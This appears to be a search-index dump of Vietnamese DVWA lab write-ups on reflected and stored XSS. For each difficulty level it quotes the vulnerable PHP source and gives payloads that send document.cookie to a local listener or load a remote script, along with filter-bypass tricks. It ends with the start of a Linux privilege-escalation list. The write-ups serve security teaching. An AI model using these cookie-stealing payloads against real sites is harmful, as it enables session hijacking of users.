th\u1ebb <svg> \u0111\u1ec3 th\u1ef1c hi\u1ec7n t\u1ea5n c\u00f4ng. Security Level: High \u00b6 Source code vulnerabilities/xss_r/source/high.php <?php header ( \"X-XSS-Protection: 0\" ); // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Get input $name = preg_replace ( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i' , '' , $_GET [ 'name' ] ); // Feedback for end user echo \"<pre>Hello { $name } </pre>\" ; } ?> Analysis \u00b6 L\u1ea7n n\u00e0y h\u1ecd c\u0169ng filter th\u1ebb <script> v\u00e0 kh\u00f4ng ph\u00e2n bi\u1ec7t ch\u1eef hoa/ch\u1eef th\u01b0\u1eddng khi nh\u1eadp v\u00e0o. Xem h\u00ecnh gi\u1ea3i th\u00edch c\u1ee7a ChatGPT b\u00ean d\u01b0\u1edbi ChatGPT Payload: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/> Exploition \u00b6 Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch tr\u00ean, ta c\u0169ng d\u00f9ng th\u1ebb <svg> \u0111\u1ec3 th\u1ef1c hi\u1ec7n t\u1ea5n c\u00f4ng. Security Level: Impossible \u00b6 Source code vulnerabilities/xss_r/source/impossible.php <?php // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars ( $_GET [ 'name' ] ); // Feedback for end user echo \"<pre>Hello { $name } </pre>\" ; } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 Ta s\u1ebd d\u00f9ng h\u00e0m htmlspecialchars() \u0111\u1ec3 bi\u1ebfn c\u00e1c k\u00ed t\u1ef1 \u0111\u1eb7c bi\u1ec7t \u1edf \u0111\u1ea7u v\u00e0o th\u00e0nh k\u00ed t\u1ef1 gi\u1ea3 gi\u00fap kh\u00f4ng th\u1ef1c thi script ta truy\u1ec1n v\u00e0o. Some problems \u00b6 Th\u1ef1c ch\u1ea5t, ta ch\u1ec9 c\u1ea7n d\u00f9ng payload <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/> l\u00e0 c\u00f3 th\u1ec3 bypass full c\u1ea5p \u0111\u1ed9 \u1edf challenge n\u00e0y nh\u01b0ng t\u00f4i mu\u1ed1n \u0111\u1ec1 c\u1eadp theo h\u01b0\u1edbng m\u00e0 b\u00ean dvwa h\u1ecd h\u01b0\u1edbng \u0111\u1ebfn vi\u1ec7c ch\u00fang ta s\u1ebd l\u00e0m. V\u00ed d\u1ee5 \u1edf c\u1ea5p \u0111\u1ed9 Medium: H\u1ecd s\u1ebd h\u01b0\u1edbng ch\u00fang ta \u0111\u1ebfn vi\u1ec7c filter ch\u1eef hoa/ch\u1eef th\u01b0\u1eddng. V\u00ec con ng\u01b0\u1eddi m\u00ecnh nh\u00ecn v\u00e0o th\u00ec xem l\u00e0 nh\u01b0 nhau nh\u01b0 v\u1ec1 m\u1eb7t b\u1ea3n ch\u1ea5t th\u00ec m\u00e3 ASCII c\u1ee7a 2 ch\u1eef l\u00e0 kh\u00e1c nhau d\u1eabn \u0111\u1ebfn th\u1ec3 hi\u1ec7n kh\u00e1c nhau. Nh\u01b0ng ch\u1eafc ch\u1eafn s\u1ebd th\u1ef1c thi c\u00f9ng 1 m\u1ee5c \u0111\u00edch. More Information \u00b6 https://owasp.org/www-community/attacks/xss/ https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://en.wikipedia.org/wiki/Cross-site_scripting http://www.cgisecurity.com/xss-faq.html http://www.scriptalert1.com/","title":"XSS Reflected"},{"location":"dvwa/xss-reflected/#xss-reflected","text":"Reflected attacks are those where the injected script is reflected off the web server, such as in an error message, search result, or any other response that includes some or all of the input sent to the server as part of the request. Reflected attacks are delivered to victims via another route, such as in an e-mail message, or on some other website. When a user is tricked into clicking on a malicious link, submitting a specially crafted form, or even just browsing to a malicious site, the injected code travels to the vulnerable web site, which reflects the attack back to the user\u2019s browser. The browser then executes the code because it came from a \u201ctrusted\u201d server. Reflected XSS is also sometimes referred to as Non-Persistent or Type-I XSS (the attack is carried out through a single request / response cycle).","title":"XSS Reflected"},{"location":"dvwa/xss-reflected/#objective","text":"One way or another, steal the cookie of a logged in user.","title":"Objective"},{"location":"dvwa/xss-reflected/#security-level-low","text":"Source code vulnerabilities/xss_r/source/low.php <?php header ( \"X-XSS-Protection: 0\" ); // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Feedback for end user echo '<pre>Hello ' . $_GET [ 'name' ] . '</pre>' ; } ?>","title":"Security Level: Low"},{"location":"dvwa/xss-reflected/#analysis","text":"Ta th\u1ea5y r\u1eb1ng challenge n\u00e0y d\u00f9ng ph\u01b0\u01a1ng th\u1ee9c GET \u0111\u1ec3 get name m\u00ecnh nh\u1eadp v\u00e0o. H\u01a1n n\u1eefa, n\u00f3 s\u1ebd say hello v\u1edbi m\u00ecnh v\u00e0 hi\u1ec3n th\u1ecb tr\u00ean trang web v\u00e0 \u0111\u1eb7t n\u00f3 v\u00e0o b\u00ean trong th\u1ebb <pre>. Do v\u1eady ta d\u1ec5 d\u00e0ng ch\u00e8n th\u1ebb <script> v\u00e0o v\u00e0 l\u1ea5y cookie user. Payload: <script>document.location='http://localhost:8000/?abc='+document.cookie</script>","title":"Analysis"},{"location":"dvwa/xss-reflected/#security-level-medium","text":"Source code vulnerabilities/xss_r/source/medium.php <?php header ( \"X-XSS-Protection: 0\" ); // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Get input $name = str_replace ( '<script>' , '' , $_GET [ 'name' ] ); // Feedback for end user echo \"<pre>Hello { $name } </pre>\" ; } ?>","title":"Security Level: Medium"},{"location":"dvwa/xss-reflected/#analysis_1","text":"V\u1edbi challenge n\u00e0y, h\u1ecd ch\u1eb7n vi\u1ec7c th\u00eam th\u1ebb <script> v\u00e0o ch\u01b0\u01a1ng tr\u00ecnh. V\u00ec h\u1ecd filter c\u1ee9ng th\u1ebb <script> n\u00ean ta c\u00f3 th\u1ec3 bypass b\u1eb1ng c\u00e1ch vi\u1ebft hoa/th\u01b0\u1eddng l\u1ed9n x\u1ed9n c\u1ee7a th\u1ec3 <script> \u0111\u1ec3 bypass challenge n\u00e0y. Payload: <sCriPt>document.location='http://localhost:8000/?abc='+document.cookie</sCrIpT>","title":"Analysis"},{"location":"dvwa/xss-reflected/#exploition","text":"Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch tr\u00ean, ta d\u00f9ng th\u1ebb <svg> \u0111\u1ec3 th\u1ef1c hi\u1ec7n t\u1ea5n c\u00f4ng.","title":"Exploition"},{"location":"dvwa/xss-reflected/#security-level-high","text":"Source code vulnerabilities/xss_r/source/high.php <?php header ( \"X-XSS-Protection: 0\" ); // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Get input $name = preg_replace ( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i' , '' , $_GET [ 'name' ] ); // Feedback for end user echo \"<pre>Hello { $name } </pre>\" ; } ?>","title":"Security Level: High"},{"location":"dvwa/xss-reflected/#analysis_2","text":"L\u1ea7n n\u00e0y h\u1ecd c\u0169ng filter th\u1ebb <script> v\u00e0 kh\u00f4ng ph\u00e2n bi\u1ec7t ch\u1eef hoa/ch\u1eef th\u01b0\u1eddng khi nh\u1eadp v\u00e0o. Xem h\u00ecnh gi\u1ea3i th\u00edch c\u1ee7a ChatGPT b\u00ean d\u01b0\u1edbi ChatGPT Payload: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/>","title":"Analysis"},{"location":"dvwa/xss-reflected/#exploition_1","text":"Nh\u01b0 \u0111\u00e3 ph\u00e2n t\u00edch tr\u00ean, ta c\u0169ng d\u00f9ng th\u1ebb <svg> \u0111\u1ec3 th\u1ef1c hi\u1ec7n t\u1ea5n c\u00f4ng.","title":"Exploition"},{"location":"dvwa/xss-reflected/#security-level-impossible","text":"Source code vulnerabilities/xss_r/source/impossible.php <?php // Is there any input? if ( array_key_exists ( \"name\" , $_GET ) && $_GET [ 'name' ] != NULL ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $name = htmlspecialchars ( $_GET [ 'name' ] ); // Feedback for end user echo \"<pre>Hello { $name } </pre>\" ; } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Impossible"},{"location":"dvwa/xss-reflected/#analysis_3","text":"Ta s\u1ebd d\u00f9ng h\u00e0m htmlspecialchars() \u0111\u1ec3 bi\u1ebfn c\u00e1c k\u00ed t\u1ef1 \u0111\u1eb7c bi\u1ec7t \u1edf \u0111\u1ea7u v\u00e0o th\u00e0nh k\u00ed t\u1ef1 gi\u1ea3 gi\u00fap kh\u00f4ng th\u1ef1c thi script ta truy\u1ec1n v\u00e0o.","title":"Analysis"},{"location":"dvwa/xss-reflected/#some-problems","text":"Th\u1ef1c ch\u1ea5t, ta ch\u1ec9 c\u1ea7n d\u00f9ng payload <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/> l\u00e0 c\u00f3 th\u1ec3 bypass full c\u1ea5p \u0111\u1ed9 \u1edf challenge n\u00e0y nh\u01b0ng t\u00f4i mu\u1ed1n \u0111\u1ec1 c\u1eadp theo h\u01b0\u1edbng m\u00e0 b\u00ean dvwa h\u1ecd h\u01b0\u1edbng \u0111\u1ebfn vi\u1ec7c ch\u00fang ta s\u1ebd l\u00e0m. V\u00ed d\u1ee5 \u1edf c\u1ea5p \u0111\u1ed9 Medium: H\u1ecd s\u1ebd h\u01b0\u1edbng ch\u00fang ta \u0111\u1ebfn vi\u1ec7c filter ch\u1eef hoa/ch\u1eef th\u01b0\u1eddng. V\u00ec con ng\u01b0\u1eddi m\u00ecnh nh\u00ecn v\u00e0o th\u00ec xem l\u00e0 nh\u01b0 nhau nh\u01b0 v\u1ec1 m\u1eb7t b\u1ea3n ch\u1ea5t th\u00ec m\u00e3 ASCII c\u1ee7a 2 ch\u1eef l\u00e0 kh\u00e1c nhau d\u1eabn \u0111\u1ebfn th\u1ec3 hi\u1ec7n kh\u00e1c nhau. Nh\u01b0ng ch\u1eafc ch\u1eafn s\u1ebd th\u1ef1c thi c\u00f9ng 1 m\u1ee5c \u0111\u00edch.","title":"Some problems"},{"location":"dvwa/xss-reflected/#more-information","text":"https://owasp.org/www-community/attacks/xss/ https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://en.wikipedia.org/wiki/Cross-site_scripting http://www.cgisecurity.com/xss-faq.html http://www.scriptalert1.com/","title":"More Information"},{"location":"dvwa/xss-stored/","tags":["DVWA","XSS","XSS Stored"],"text":"XSS Stored \u00b6 Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-II XSS. Objective \u00b6 Redirect everyone to a web page of your choosing. Security Level: Low \u00b6 Source code vulnerabilities/xss_s/source/low.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitize name input $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); //mysql_close(); } ?> Analysis and exploition \u00b6 Ta s\u1ebd ti\u00eam payload \u1edf challenge XSS v\u00e0o box name ho\u1eb7c box message Payload: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/> Nh\u01b0ng ta s\u1ebd kh\u00f4ng th\u1ec3 ti\u00eam \u0111\u1ea7y \u0111\u1ee7 payload tr\u00ean v\u00e0o c\u1ea3 2 box \u0111\u01b0\u1ee3c v\u00ec c\u01a1 b\u1ea3n t\u1eeb ph\u00eda database h\u1ecd \u0111\u00e3 set \u0111\u1ed9 d\u00e0i gi\u00e1 tr\u1ecb c\u1ee7a c\u00e1c bi\u1ebfn name , message . Ta ph\u1ea3i gi\u1edbi h\u1ea1n l\u1ea1i \u0111\u1ed9 d\u00e0i c\u1ee7a payload b\u1eb1ng vi\u1ec7c l\u01b0u n\u00f3 v\u00e0o file n\u00e0o \u0111\u00f3 ( a.js ch\u1eb3ng h\u1ea1n) v\u00e0 m\u1edf m\u1ed9t k\u1ebft n\u1ed1i local \u0111\u1ec3 ch\u1ea1y script. Payload: <script src=http://localhost:8000/a.js></script> Security Level: Medium \u00b6 Source code vulnerabilities/xss_s/source/medium.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = strip_tags ( addslashes ( $message ) ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $message = htmlspecialchars ( $message ); // Sanitize name input $name = str_replace ( '<script>' , '' , $name ); $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); //mysql_close(); } ?> Analysis \u00b6 Challenge n\u00e0y h\u1ecd filter l\u1ea1i th\u1ebb kh\u00f4ng cho \u0111\u0103ng t\u1ea3i th\u1ebb <script> nh\u01b0ng hi\u1ec3n nhi\u00ean ta c\u00f3 th\u1ec3 d\u00f9ng th\u1ebb <img> ho\u1eb7c <svg>,... \u0111\u1ec3 bypass n\u00f3. Y h\u1ec7t challenge XSS Reflected Exploition \u00b6 Security Level: High \u00b6 Source code vulnerabilities/xss_s/source/high.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = strip_tags ( addslashes ( $message ) ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $message = htmlspecialchars ( $message ); // Sanitize name input $name = preg_replace ( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i' , '' , $name ); $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); //mysql_close(); } ?> Analysis and exploition \u00b6 \u1ede m\u1ee9c \u0111\u1ed9 n\u00e0y, h\u1ecd filter y h\u1ec7t challenge high c\u1ee7a XSS Reflected . Do \u0111\u00f3 ta c\u0169ng d\u00f9ng ch\u00ednh payload c\u0169, v\u1eabn c\u00f3 th\u1ec3 bypass v\u00e0 l\u1ea5y \u0111\u01b0\u1ee3c cookie use. Security Level: Impossible \u00b6 Source code vulnerabilities/xss_s/source/impossible.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $message = htmlspecialchars ( $message ); // Sanitize name input $name = stripslashes ( $name ); $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $name = htmlspecialchars ( $name ); // Update database $data = $db -> prepare ( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data -> bindParam ( ':message' , $message , PDO :: PARAM_STR ); $data -> bindParam ( ':name' , $name , PDO :: PARAM_STR ); $data -> execute (); } // Generate Anti-CSRF token generateSessionToken (); ?> Analysis \u00b6 Xem t\u1ea1i /dvwa/xss-reflected/#security-level-impossible What we learned \u00b6 More Information \u00b6 https://owasp.org/www-community/attacks/xss https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://en.wikipedia.org/wiki/Cross-site_scripting http://www.cgisecurity.com/xss-faq.html http://www.scriptalert1.com/","title":"XSS Stored"},{"location":"dvwa/xss-stored/#xss-stored","text":"Stored attacks are those where the injected script is permanently stored on the target servers, such as in a database, in a message forum, visitor log, comment field, etc. The victim then retrieves the malicious script from the server when it requests the stored information. Stored XSS is also sometimes referred to as Persistent or Type-II XSS.","title":"XSS Stored"},{"location":"dvwa/xss-stored/#objective","text":"Redirect everyone to a web page of your choosing.","title":"Objective"},{"location":"dvwa/xss-stored/#security-level-low","text":"Source code vulnerabilities/xss_s/source/low.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Sanitize name input $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); //mysql_close(); } ?>","title":"Security Level: Low"},{"location":"dvwa/xss-stored/#analysis-and-exploition","text":"Ta s\u1ebd ti\u00eam payload \u1edf challenge XSS v\u00e0o box name ho\u1eb7c box message Payload: <svg xmlns=\"http://www.w3.org/2000/svg\" onload=\"document.location='http://localhost:8000/?abc='+document.cookie\"/> Nh\u01b0ng ta s\u1ebd kh\u00f4ng th\u1ec3 ti\u00eam \u0111\u1ea7y \u0111\u1ee7 payload tr\u00ean v\u00e0o c\u1ea3 2 box \u0111\u01b0\u1ee3c v\u00ec c\u01a1 b\u1ea3n t\u1eeb ph\u00eda database h\u1ecd \u0111\u00e3 set \u0111\u1ed9 d\u00e0i gi\u00e1 tr\u1ecb c\u1ee7a c\u00e1c bi\u1ebfn name , message . Ta ph\u1ea3i gi\u1edbi h\u1ea1n l\u1ea1i \u0111\u1ed9 d\u00e0i c\u1ee7a payload b\u1eb1ng vi\u1ec7c l\u01b0u n\u00f3 v\u00e0o file n\u00e0o \u0111\u00f3 ( a.js ch\u1eb3ng h\u1ea1n) v\u00e0 m\u1edf m\u1ed9t k\u1ebft n\u1ed1i local \u0111\u1ec3 ch\u1ea1y script. Payload: <script src=http://localhost:8000/a.js></script>","title":"Analysis and exploition"},{"location":"dvwa/xss-stored/#security-level-medium","text":"Source code vulnerabilities/xss_s/source/medium.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = strip_tags ( addslashes ( $message ) ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $message = htmlspecialchars ( $message ); // Sanitize name input $name = str_replace ( '<script>' , '' , $name ); $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); //mysql_close(); } ?>","title":"Security Level: Medium"},{"location":"dvwa/xss-stored/#analysis","text":"Challenge n\u00e0y h\u1ecd filter l\u1ea1i th\u1ebb kh\u00f4ng cho \u0111\u0103ng t\u1ea3i th\u1ebb <script> nh\u01b0ng hi\u1ec3n nhi\u00ean ta c\u00f3 th\u1ec3 d\u00f9ng th\u1ebb <img> ho\u1eb7c <svg>,... \u0111\u1ec3 bypass n\u00f3. Y h\u1ec7t challenge XSS Reflected","title":"Analysis"},{"location":"dvwa/xss-stored/#exploition","text":"","title":"Exploition"},{"location":"dvwa/xss-stored/#security-level-high","text":"Source code vulnerabilities/xss_s/source/high.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = strip_tags ( addslashes ( $message ) ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $message = htmlspecialchars ( $message ); // Sanitize name input $name = preg_replace ( '/<(.*)s(.*)c(.*)r(.*)i(.*)p(.*)t/i' , '' , $name ); $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); // Update database $query = \"INSERT INTO guestbook ( comment, name ) VALUES ( ' $message ', ' $name ' );\" ; $result = mysqli_query ( $GLOBALS [ \"___mysqli_ston\" ], $query ) or die ( '<pre>' . (( is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_error ( $GLOBALS [ \"___mysqli_ston\" ]) : (( $___mysqli_res = mysqli_connect_error ()) ? $___mysqli_res : false )) . '</pre>' ); //mysql_close(); } ?>","title":"Security Level: High"},{"location":"dvwa/xss-stored/#analysis-and-exploition_1","text":"\u1ede m\u1ee9c \u0111\u1ed9 n\u00e0y, h\u1ecd filter y h\u1ec7t challenge high c\u1ee7a XSS Reflected . Do \u0111\u00f3 ta c\u0169ng d\u00f9ng ch\u00ednh payload c\u0169, v\u1eabn c\u00f3 th\u1ec3 bypass v\u00e0 l\u1ea5y \u0111\u01b0\u1ee3c cookie use.","title":"Analysis and exploition"},{"location":"dvwa/xss-stored/#security-level-impossible","text":"Source code vulnerabilities/xss_s/source/impossible.php <?php if ( isset ( $_POST [ 'btnSign' ] ) ) { // Check Anti-CSRF token checkToken ( $_REQUEST [ 'user_token' ], $_SESSION [ 'session_token' ], 'index.php' ); // Get input $message = trim ( $_POST [ 'mtxMessage' ] ); $name = trim ( $_POST [ 'txtName' ] ); // Sanitize message input $message = stripslashes ( $message ); $message = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $message ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $message = htmlspecialchars ( $message ); // Sanitize name input $name = stripslashes ( $name ); $name = (( isset ( $GLOBALS [ \"___mysqli_ston\" ]) && is_object ( $GLOBALS [ \"___mysqli_ston\" ])) ? mysqli_real_escape_string ( $GLOBALS [ \"___mysqli_ston\" ], $name ) : (( trigger_error ( \"[MySQLConverterToo] Fix the mysql_escape_string() call! This code does not work.\" , E_USER_ERROR )) ? \"\" : \"\" )); $name = htmlspecialchars ( $name ); // Update database $data = $db -> prepare ( 'INSERT INTO guestbook ( comment, name ) VALUES ( :message, :name );' ); $data -> bindParam ( ':message' , $message , PDO :: PARAM_STR ); $data -> bindParam ( ':name' , $name , PDO :: PARAM_STR ); $data -> execute (); } // Generate Anti-CSRF token generateSessionToken (); ?>","title":"Security Level: Impossible"},{"location":"dvwa/xss-stored/#analysis_1","text":"Xem t\u1ea1i /dvwa/xss-reflected/#security-level-impossible","title":"Analysis"},{"location":"dvwa/xss-stored/#what-we-learned","text":"","title":"What we learned"},{"location":"dvwa/xss-stored/#more-information","text":"https://owasp.org/www-community/attacks/xss https://owasp.org/www-community/xss-filter-evasion-cheatsheet https://en.wikipedia.org/wiki/Cross-site_scripting http://www.cgisecurity.com/xss-faq.html http://www.scriptalert1.com/","title":"More Information"},{"location":"notes/privilege-escalation/linux/","tags":["Privilege Escalation","Linux"],"text":"Linux Privilege Escalation \u00b6 https://gtfobins.github.io/ https://grimbins.github.io/ Privilege Escalation Methods \u00b6 Basic System Enumeration Bash History OpenVPN Credentials Credentials in tcpdump files Writable Files SSH Private Keys Kernel Expliots Sudo -l Sudo CVE Sudo LD_PRELOAD SUID / GUID Binaries SUID PATH Environmental Variable Cron Tabs & Scheduled Tasks Capabilities (Python - Perl - Tar - OpenSSL) NFS Root Squashing chkrootkit 0.49 Tmux (Attach Session) Screen (Attach Session) MySQL Running as root MySQL UDF (User-Defined Functions) Code (UDF) Injection Basic System Enumeration \u00b6 uname -a hostname 